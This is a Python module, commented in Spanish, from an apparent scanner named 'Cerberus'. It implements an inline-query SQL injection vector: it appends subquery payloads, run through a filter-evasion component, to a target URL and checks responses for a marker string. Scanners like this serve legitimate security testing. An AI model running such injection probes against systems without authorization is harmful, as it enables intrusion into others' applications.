import logging
from typing import Dict, Any
from backend.core.vector_base import BaseVector
from backend.core.payload_evader import PayloadEvader

logger = logging.getLogger("cerberus_vector_inline")

class VectorInline(BaseVector):
    """
    Motor nativo asíncrono para inyección basada en consultas en línea (Inline Queries).
    Prueba si el motor permite subconsultas dentro de expresiones.
    """

    async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
        logger.info(f"[*] Native Engine: Iniciando Vector Inline-based sobre {self.target_url}")
        
        # Instanciar el evasor dinámico
        evader = PayloadEvader(context.get("aggressiveness", 3))
        
        # Marcadores únicos para confirmación
        payloads = [
            evader.evade(" (SELECT 'CERBERUS_INLINE_CONFIRM') "),
            evader.evade(" (SELECT (CHAR(67,69,82,66,69,82,85,83))) "), # 'CERBERUS'
        ]

        for payload in payloads:
            test_url = f"{self.target_url}{payload}"
            resp = await self._safe_get(test_url)
            
            if resp and ("CERBERUS_INLINE_CONFIRM" in resp.text or "CERBERUS" in resp.text):
                logger.info(f"[+] Inyección Inline-Query Exitosa con payload {payload}")
                return {
                    "status": "vulnerable",
                    "technique": "Inline queries",
                    "evidence": f"Successfully confirmed subquery execution with payload: {payload}"
                }

        return {"status": "not_vulnerable"}

    async def _safe_get(self, url: str):
        try:
            return await self.client.get(url, timeout=10.0)
        except Exception as e:
            logger.warning(f"Error HTTP en vector inline: {e}")
            return None
